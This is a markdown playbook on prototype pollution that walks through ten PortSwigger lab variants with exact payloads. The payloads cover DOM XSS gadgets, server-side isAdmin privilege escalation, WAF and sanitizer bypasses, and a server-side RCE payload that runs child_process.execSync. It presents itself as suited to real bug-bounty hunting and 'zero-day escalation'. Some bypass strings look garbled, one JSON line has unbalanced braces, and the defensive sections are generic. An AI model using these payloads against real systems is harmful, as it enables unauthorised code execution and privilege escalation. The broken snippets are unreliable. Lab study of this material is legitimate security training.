---
name: "Prototype Pollution — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1059.007"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Prototype Pollution — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Client-side via browser APIs 🟡 PRACTITIONER
```
?__proto__[testproperty]=testvalue
```
Check: `Object.prototype.testproperty` in console → if `testvalue` = polluted.
---

### Lab 2: DOM XSS via client-side PP 🟡 PRACTITIONER
Find a gadget (property used in a sink):
```
?__proto__[transport_url]=data:,alert(1)//
```
---

### Lab 3: Alternative PP vector 🟡 PRACTITIONER
```
?__proto__[sequence]=alert(1)-
```
Or: `constructor.prototype` instead of `__proto__`.
---

### Lab 4: Flawed sanitization bypass 🟡 PRACTITIONER
`con].__pro__]` patterns if sanitizer strips `__proto__`. Try `constructor[prototype]` or nested `__pro__proto__to__`.
---

### Lab 5: Third-party library PP 🟡 PRACTITIONER
Library-specific gadgets. Use DOM Invader (Burp) to auto-detect pollutable properties and gadgets.
---

### Lab 6: Server-side privilege escalation 🟡 PRACTITIONER
```json
{"__proto__":{"isAdmin":true}}
```
Pollute Object.prototype → all objects inherit `isAdmin: true`.
---

### Lab 7: Detect without reflection 🟡 PRACTITIONER
```json
{"__proto__":{"status":555}}
```
If response code changes to 555 → server-side pollution confirmed.
---

### Lab 8: Bypass flawed input filters 🟡 PRACTITIONER
```json
{"constructor":{"prototype":{"isAdmin":true}}}
```
Or: `{"__proto__":{"json spaces":10}}` → response formatting changes = confirmed.
---

### Lab 9: Server-side RCE 🔴 EXPERT
```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
```
Or via child_process gadget: `{"__proto__":{"execArgv":["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}}}`
---

### Lab 10: Exfiltrate sensitive data 🔴 EXPERT
```json
{"__proto__":{"content-type":"application/json","json spaces":10}}
```
Then find property that leaks data in reflected responses.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
